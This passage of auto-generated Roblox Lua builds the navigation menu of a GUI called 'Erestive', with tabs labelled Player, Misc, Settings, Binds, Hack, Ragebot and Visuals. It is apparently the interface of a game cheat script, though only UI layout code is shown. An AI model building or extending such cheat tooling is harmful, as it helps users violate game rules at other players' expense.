G2L["4a6"] = Instance.new("UIStroke", G2L["4a3"]);
G2L["4a6"]["Enabled"] = false;
G2L["4a6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["4a6"]["Thickness"] = 0.6;
G2L["4a6"]["Color"] = Color3.fromRGB(31, 32, 36);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.1Frame.Image
G2L["4a7"] = Instance.new("ImageLabel", G2L["4a3"]);
G2L["4a7"]["BorderSizePixel"] = 0;
G2L["4a7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["4a7"]["ImageColor3"] = Color3.fromRGB(69, 68, 66);
G2L["4a7"]["Image"] = [[rbxassetid://7992557358]];
G2L["4a7"]["Size"] = UDim2.new(0, 43, 0, 43);
G2L["4a7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4a7"]["BackgroundTransparency"] = 1;
G2L["4a7"]["Name"] = [[Image]];


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.1Frame.TextLabel
G2L["4a8"] = Instance.new("TextLabel", G2L["4a3"]);
G2L["4a8"]["TextWrapped"] = true;
G2L["4a8"]["BorderSizePixel"] = 0;
G2L["4a8"]["TextSize"] = 16;
G2L["4a8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4a8"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4a8"]["TextColor3"] = Color3.fromRGB(69, 68, 66);
G2L["4a8"]["BackgroundTransparency"] = 1;
G2L["4a8"]["Size"] = UDim2.new(0.71458, 0, 1, 0);
G2L["4a8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4a8"]["Text"] = [[You]];
G2L["4a8"]["Position"] = UDim2.new(0.34098, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.1Frame.UIListLayout
G2L["4a9"] = Instance.new("UIListLayout", G2L["4a3"]);
G2L["4a9"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["4a9"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["4a9"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.2Frame
G2L["4aa"] = Instance.new("TextButton", G2L["49e"]);
G2L["4aa"]["BorderSizePixel"] = 0;
G2L["4aa"]["TextSize"] = 16;
G2L["4aa"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4aa"]["BackgroundColor3"] = Color3.fromRGB(45, 49, 55);
G2L["4aa"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["4aa"]["BackgroundTransparency"] = 1;
G2L["4aa"]["Size"] = UDim2.new(0.9, 0, 0.05314, 0);
G2L["4aa"]["Text"] = [[]];
G2L["4aa"]["Name"] = [[2Frame]];
G2L["4aa"]["Position"] = UDim2.new(0.05, 0, 0.04147, 0);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.2Frame.UICorner
G2L["4ab"] = Instance.new("UICorner", G2L["4aa"]);
G2L["4ab"]["CornerRadius"] = UDim.new(0, 4);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.2Frame.UIStroke
G2L["4ac"] = Instance.new("UIStroke", G2L["4aa"]);
G2L["4ac"]["Enabled"] = false;
G2L["4ac"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["4ac"]["Thickness"] = 0.6;
G2L["4ac"]["Color"] = Color3.fromRGB(31, 32, 36);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.2Frame.Image
G2L["4ad"] = Instance.new("ImageLabel", G2L["4aa"]);
G2L["4ad"]["BorderSizePixel"] = 0;
G2L["4ad"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["4ad"]["ImageColor3"] = Color3.fromRGB(69, 68, 66);
G2L["4ad"]["Image"] = [[rbxassetid://118405423172740]];
G2L["4ad"]["Size"] = UDim2.new(0, 43, 0, 43);
G2L["4ad"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4ad"]["BackgroundTransparency"] = 1;
G2L["4ad"]["Name"] = [[Image]];


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.2Frame.TextLabel
G2L["4ae"] = Instance.new("TextLabel", G2L["4aa"]);
G2L["4ae"]["TextWrapped"] = true;
G2L["4ae"]["BorderSizePixel"] = 0;
G2L["4ae"]["TextSize"] = 16;
G2L["4ae"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4ae"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4ae"]["TextColor3"] = Color3.fromRGB(69, 68, 66);
G2L["4ae"]["BackgroundTransparency"] = 1;
G2L["4ae"]["Size"] = UDim2.new(0.71458, 0, 1, 0);
G2L["4ae"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4ae"]["Text"] = [[Misc]];
G2L["4ae"]["Position"] = UDim2.new(0.34098, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.2Frame.UIListLayout
G2L["4af"] = Instance.new("UIListLayout", G2L["4aa"]);
G2L["4af"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["4af"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["4af"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.4Frametext
G2L["4b0"] = Instance.new("TextLabel", G2L["49e"]);
G2L["4b0"]["BorderSizePixel"] = 0;
G2L["4b0"]["TextSize"] = 14;
G2L["4b0"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30);
G2L["4b0"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Regular, Enum.FontStyle.Italic);
G2L["4b0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4b0"]["BackgroundTransparency"] = 0.4;
G2L["4b0"]["Size"] = UDim2.new(1, 0, 0.02884, 0);
G2L["4b0"]["Visible"] = false;
G2L["4b0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4b0"]["Text"] = [[Settings]];
G2L["4b0"]["Name"] = [[4Frametext]];
G2L["4b0"]["Position"] = UDim2.new(0, 0, 0.05876, 0);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.3Frame
G2L["4b1"] = Instance.new("TextButton", G2L["49e"]);
G2L["4b1"]["BorderSizePixel"] = 0;
G2L["4b1"]["TextSize"] = 16;
G2L["4b1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4b1"]["BackgroundColor3"] = Color3.fromRGB(45, 49, 55);
G2L["4b1"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["4b1"]["BackgroundTransparency"] = 1;
G2L["4b1"]["Size"] = UDim2.new(0.9, 0, 0.05314, 0);
G2L["4b1"]["Text"] = [[]];
G2L["4b1"]["Name"] = [[3Frame]];
G2L["4b1"]["Position"] = UDim2.new(0.05, 0, 0.04147, 0);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.3Frame.UICorner
G2L["4b2"] = Instance.new("UICorner", G2L["4b1"]);
G2L["4b2"]["CornerRadius"] = UDim.new(0, 4);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.3Frame.UIStroke
G2L["4b3"] = Instance.new("UIStroke", G2L["4b1"]);
G2L["4b3"]["Enabled"] = false;
G2L["4b3"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["4b3"]["Thickness"] = 0.6;
G2L["4b3"]["Color"] = Color3.fromRGB(31, 32, 36);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.3Frame.Image
G2L["4b4"] = Instance.new("ImageLabel", G2L["4b1"]);
G2L["4b4"]["BorderSizePixel"] = 0;
G2L["4b4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["4b4"]["ImageColor3"] = Color3.fromRGB(69, 68, 66);
G2L["4b4"]["Image"] = [[rbxassetid://7059346373]];
G2L["4b4"]["Size"] = UDim2.new(0, 43, 0, 43);
G2L["4b4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4b4"]["BackgroundTransparency"] = 1;
G2L["4b4"]["Name"] = [[Image]];


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.3Frame.TextLabel
G2L["4b5"] = Instance.new("TextLabel", G2L["4b1"]);
G2L["4b5"]["TextWrapped"] = true;
G2L["4b5"]["BorderSizePixel"] = 0;
G2L["4b5"]["TextSize"] = 16;
G2L["4b5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4b5"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4b5"]["TextColor3"] = Color3.fromRGB(69, 68, 66);
G2L["4b5"]["BackgroundTransparency"] = 1;
G2L["4b5"]["Size"] = UDim2.new(0.71458, 0, 1, 0);
G2L["4b5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4b5"]["Text"] = [[Settings]];
G2L["4b5"]["Position"] = UDim2.new(0.34098, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.3Frame.UIListLayout
G2L["4b6"] = Instance.new("UIListLayout", G2L["4b1"]);
G2L["4b6"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["4b6"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["4b6"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.1Frametext
G2L["4b7"] = Instance.new("TextLabel", G2L["49e"]);
G2L["4b7"]["BorderSizePixel"] = 0;
G2L["4b7"]["TextSize"] = 14;
G2L["4b7"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30);
G2L["4b7"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Regular, Enum.FontStyle.Italic);
G2L["4b7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4b7"]["BackgroundTransparency"] = 0.4;
G2L["4b7"]["Size"] = UDim2.new(1, 0, 0.02884, 0);
G2L["4b7"]["Visible"] = false;
G2L["4b7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4b7"]["Text"] = [[Player]];
G2L["4b7"]["Name"] = [[1Frametext]];
G2L["4b7"]["Position"] = UDim2.new(0, 0, 0.05876, 0);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.4Frame
G2L["4b8"] = Instance.new("TextButton", G2L["49e"]);
G2L["4b8"]["BorderSizePixel"] = 0;
G2L["4b8"]["TextSize"] = 16;
G2L["4b8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4b8"]["BackgroundColor3"] = Color3.fromRGB(45, 49, 55);
G2L["4b8"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["4b8"]["BackgroundTransparency"] = 1;
G2L["4b8"]["Size"] = UDim2.new(0.9, 0, 0.05314, 0);
G2L["4b8"]["Text"] = [[]];
G2L["4b8"]["Name"] = [[4Frame]];
G2L["4b8"]["Position"] = UDim2.new(0.05, 0, 0.04147, 0);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.4Frame.UIStroke
G2L["4b9"] = Instance.new("UIStroke", G2L["4b8"]);
G2L["4b9"]["Enabled"] = false;
G2L["4b9"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["4b9"]["Thickness"] = 0.6;
G2L["4b9"]["Color"] = Color3.fromRGB(31, 32, 36);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.4Frame.Image
G2L["4ba"] = Instance.new("ImageLabel", G2L["4b8"]);
G2L["4ba"]["BorderSizePixel"] = 0;
G2L["4ba"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["4ba"]["ImageColor3"] = Color3.fromRGB(69, 68, 66);
G2L["4ba"]["Image"] = [[rbxassetid://113868891374412]];
G2L["4ba"]["Size"] = UDim2.new(0, 43, 0, 43);
G2L["4ba"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4ba"]["BackgroundTransparency"] = 1;
G2L["4ba"]["Name"] = [[Image]];


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.4Frame.TextLabel
G2L["4bb"] = Instance.new("TextLabel", G2L["4b8"]);
G2L["4bb"]["TextWrapped"] = true;
G2L["4bb"]["BorderSizePixel"] = 0;
G2L["4bb"]["TextSize"] = 16;
G2L["4bb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4bb"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4bb"]["TextColor3"] = Color3.fromRGB(69, 68, 66);
G2L["4bb"]["BackgroundTransparency"] = 1;
G2L["4bb"]["Size"] = UDim2.new(0.71458, 0, 1, 0);
G2L["4bb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4bb"]["Text"] = [[Binds]];
G2L["4bb"]["Position"] = UDim2.new(0.34098, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.4Frame.UIListLayout
G2L["4bc"] = Instance.new("UIListLayout", G2L["4b8"]);
G2L["4bc"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["4bc"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["4bc"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.4Frame.UICorner
G2L["4bd"] = Instance.new("UICorner", G2L["4b8"]);
G2L["4bd"]["CornerRadius"] = UDim.new(0, 4);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.6Frametext
G2L["4be"] = Instance.new("TextLabel", G2L["49e"]);
G2L["4be"]["BorderSizePixel"] = 0;
G2L["4be"]["TextSize"] = 14;
G2L["4be"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30);
G2L["4be"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Regular, Enum.FontStyle.Italic);
G2L["4be"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4be"]["BackgroundTransparency"] = 0.4;
G2L["4be"]["Size"] = UDim2.new(1, 0, 0.02884, 0);
G2L["4be"]["Visible"] = false;
G2L["4be"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4be"]["Text"] = [[Hack]];
G2L["4be"]["Name"] = [[6Frametext]];
G2L["4be"]["Position"] = UDim2.new(0, 0, 0.05876, 0);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.5Frame
G2L["4bf"] = Instance.new("TextButton", G2L["49e"]);
G2L["4bf"]["BorderSizePixel"] = 0;
G2L["4bf"]["TextSize"] = 16;
G2L["4bf"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4bf"]["BackgroundColor3"] = Color3.fromRGB(45, 49, 55);
G2L["4bf"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["4bf"]["BackgroundTransparency"] = 1;
G2L["4bf"]["Size"] = UDim2.new(0.9, 0, 0.05314, 0);
G2L["4bf"]["Text"] = [[]];
G2L["4bf"]["Name"] = [[5Frame]];
G2L["4bf"]["Position"] = UDim2.new(0.05, 0, 0.04147, 0);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.5Frame.UICorner
G2L["4c0"] = Instance.new("UICorner", G2L["4bf"]);
G2L["4c0"]["CornerRadius"] = UDim.new(0, 4);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.5Frame.UIStroke
G2L["4c1"] = Instance.new("UIStroke", G2L["4bf"]);
G2L["4c1"]["Enabled"] = false;
G2L["4c1"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["4c1"]["Thickness"] = 0.6;
G2L["4c1"]["Color"] = Color3.fromRGB(31, 32, 36);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.5Frame.Image
G2L["4c2"] = Instance.new("ImageLabel", G2L["4bf"]);
G2L["4c2"]["BorderSizePixel"] = 0;
G2L["4c2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["4c2"]["ImageColor3"] = Color3.fromRGB(69, 68, 66);
G2L["4c2"]["Image"] = [[rbxassetid://18467008619]];
G2L["4c2"]["Size"] = UDim2.new(0, 43, 0, 43);
G2L["4c2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4c2"]["BackgroundTransparency"] = 1;
G2L["4c2"]["Name"] = [[Image]];


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.5Frame.Image.NEW
G2L["4c3"] = Instance.new("Frame", G2L["4c2"]);
G2L["4c3"]["Visible"] = false;
G2L["4c3"]["BorderSizePixel"] = 0;
G2L["4c3"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 0);
G2L["4c3"]["Size"] = UDim2.new(0, 19, 0, 19);
G2L["4c3"]["Position"] = UDim2.new(0.65116, 0, -0.18605, 0);
G2L["4c3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4c3"]["Name"] = [[NEW]];


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.5Frame.Image.NEW.UICorner
G2L["4c4"] = Instance.new("UICorner", G2L["4c3"]);
G2L["4c4"]["CornerRadius"] = UDim.new(0, 50);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.5Frame.Image.NEW.TextLabel
G2L["4c5"] = Instance.new("TextLabel", G2L["4c3"]);
G2L["4c5"]["TextWrapped"] = true;
G2L["4c5"]["BorderSizePixel"] = 0;
G2L["4c5"]["TextSize"] = 14;
G2L["4c5"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4c5"]["TextScaled"] = true;
G2L["4c5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4c5"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4c5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4c5"]["BackgroundTransparency"] = 1;
G2L["4c5"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["4c5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4c5"]["Text"] = [[!]];


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.5Frame.Image.NEW.TextLabel.UIStroke
G2L["4c6"] = Instance.new("UIStroke", G2L["4c5"]);
G2L["4c6"]["Thickness"] = 0.43;
G2L["4c6"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.5Frame.TextLabel
G2L["4c7"] = Instance.new("TextLabel", G2L["4bf"]);
G2L["4c7"]["TextWrapped"] = true;
G2L["4c7"]["BorderSizePixel"] = 0;
G2L["4c7"]["TextSize"] = 16;
G2L["4c7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4c7"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4c7"]["TextColor3"] = Color3.fromRGB(69, 68, 66);
G2L["4c7"]["BackgroundTransparency"] = 1;
G2L["4c7"]["Size"] = UDim2.new(0.71458, 0, 1, 0);
G2L["4c7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4c7"]["Text"] = [[Ragebot]];
G2L["4c7"]["Position"] = UDim2.new(0.14729, 0, -0.60797, 0);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.5Frame.UIListLayout
G2L["4c8"] = Instance.new("UIListLayout", G2L["4bf"]);
G2L["4c8"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["4c8"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["4c8"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.7Frame
G2L["4c9"] = Instance.new("TextButton", G2L["49e"]);
G2L["4c9"]["BorderSizePixel"] = 0;
G2L["4c9"]["TextSize"] = 16;
G2L["4c9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4c9"]["BackgroundColor3"] = Color3.fromRGB(45, 49, 55);
G2L["4c9"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["4c9"]["BackgroundTransparency"] = 1;
G2L["4c9"]["Size"] = UDim2.new(0.9, 0, 0.05314, 0);
G2L["4c9"]["Text"] = [[]];
G2L["4c9"]["Name"] = [[7Frame]];
G2L["4c9"]["Position"] = UDim2.new(0.05, 0, 0.04147, 0);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.7Frame.UICorner
G2L["4ca"] = Instance.new("UICorner", G2L["4c9"]);
G2L["4ca"]["CornerRadius"] = UDim.new(0, 4);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.7Frame.UIStroke
G2L["4cb"] = Instance.new("UIStroke", G2L["4c9"]);
G2L["4cb"]["Enabled"] = false;
G2L["4cb"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["4cb"]["Thickness"] = 0.6;
G2L["4cb"]["Color"] = Color3.fromRGB(31, 32, 36);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.7Frame.Image
G2L["4cc"] = Instance.new("ImageLabel", G2L["4c9"]);
G2L["4cc"]["BorderSizePixel"] = 0;
G2L["4cc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["4cc"]["ImageColor3"] = Color3.fromRGB(69, 68, 66);
G2L["4cc"]["Image"] = [[rbxassetid://78134819718605]];
G2L["4cc"]["Size"] = UDim2.new(0, 43, 0, 43);
G2L["4cc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4cc"]["BackgroundTransparency"] = 1;
G2L["4cc"]["Name"] = [[Image]];


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.7Frame.Image.NEW
G2L["4cd"] = Instance.new("Frame", G2L["4cc"]);
G2L["4cd"]["Visible"] = false;
G2L["4cd"]["BorderSizePixel"] = 0;
G2L["4cd"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 0);
G2L["4cd"]["Size"] = UDim2.new(0, 19, 0, 19);
G2L["4cd"]["Position"] = UDim2.new(0.65116, 0, -0.18605, 0);
G2L["4cd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4cd"]["Name"] = [[NEW]];


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.7Frame.Image.NEW.UICorner
G2L["4ce"] = Instance.new("UICorner", G2L["4cd"]);
G2L["4ce"]["CornerRadius"] = UDim.new(0, 50);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.7Frame.Image.NEW.TextLabel
G2L["4cf"] = Instance.new("TextLabel", G2L["4cd"]);
G2L["4cf"]["TextWrapped"] = true;
G2L["4cf"]["BorderSizePixel"] = 0;
G2L["4cf"]["TextSize"] = 14;
G2L["4cf"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4cf"]["TextScaled"] = true;
G2L["4cf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4cf"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4cf"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4cf"]["BackgroundTransparency"] = 1;
G2L["4cf"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["4cf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4cf"]["Text"] = [[!]];


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.7Frame.Image.NEW.TextLabel.UIStroke
G2L["4d0"] = Instance.new("UIStroke", G2L["4cf"]);
G2L["4d0"]["Thickness"] = 0.43;
G2L["4d0"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.7Frame.TextLabel
G2L["4d1"] = Instance.new("TextLabel", G2L["4c9"]);
G2L["4d1"]["TextWrapped"] = true;
G2L["4d1"]["BorderSizePixel"] = 0;
G2L["4d1"]["TextSize"] = 16;
G2L["4d1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4d1"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4d1"]["TextColor3"] = Color3.fromRGB(69, 68, 66);
G2L["4d1"]["BackgroundTransparency"] = 1;
G2L["4d1"]["Size"] = UDim2.new(0.71458, 0, 1, 0);
G2L["4d1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4d1"]["Text"] = [[Visuals]];
G2L["4d1"]["Position"] = UDim2.new(0.14729, 0, -0.60797, 0);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.7Frame.UIListLayout
G2L["4d2"] = Instance.new("UIListLayout", G2L["4c9"]);
G2L["4d2"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["4d2"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["4d2"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.6Frame
G2L["4d3"] = Instance.new("TextButton", G2L["49e"]);
G2L["4d3"]["BorderSizePixel"] = 0;
G2L["4d3"]["TextSize"] = 16;
G2L["4d3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4d3"]["BackgroundColor3"] = Color3.fromRGB(45, 49, 55);
G2L["4d3"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["4d3"]["BackgroundTransparency"] = 1;
G2L["4d3"]["Size"] = UDim2.new(0.9, 0, 0.05314, 0);
G2L["4d3"]["Text"] = [[]];
G2L["4d3"]["Name"] = [[6Frame]];
G2L["4d3"]["Position"] = UDim2.new(0.05, 0, 0.04147, 0);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.6Frame.UICorner
G2L["4d4"] = Instance.new("UICorner", G2L["4d3"]);
G2L["4d4"]["CornerRadius"] = UDim.new(0, 4);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.6Frame.UIStroke
G2L["4d5"] = Instance.new("UIStroke", G2L["4d3"]);
G2L["4d5"]["Enabled"] = false;
G2L["4d5"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["4d5"]["Thickness"] = 0.6;
G2L["4d5"]["Color"] = Color3.fromRGB(31, 32, 36);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.6Frame.Image
G2L["4d6"] = Instance.new("ImageLabel", G2L["4d3"]);
G2L["4d6"]["BorderSizePixel"] = 0;
G2L["4d6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["4d6"]["ImageColor3"] = Color3.fromRGB(69, 68, 66);
G2L["4d6"]["Image"] = [[rbxassetid://139650104834071]];
G2L["4d6"]["Size"] = UDim2.new(0, 43, 0, 43);
G2L["4d6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4d6"]["BackgroundTransparency"] = 1;
G2L["4d6"]["Name"] = [[Image]];


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.6Frame.Image.NEW
G2L["4d7"] = Instance.new("Frame", G2L["4d6"]);
G2L["4d7"]["Visible"] = false;
G2L["4d7"]["BorderSizePixel"] = 0;
G2L["4d7"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 0);
G2L["4d7"]["Size"] = UDim2.new(0, 19, 0, 19);
G2L["4d7"]["Position"] = UDim2.new(0.65116, 0, -0.18605, 0);
G2L["4d7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4d7"]["Name"] = [[NEW]];


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.6Frame.Image.NEW.UICorner
G2L["4d8"] = Instance.new("UICorner", G2L["4d7"]);
G2L["4d8"]["CornerRadius"] = UDim.new(0, 50);


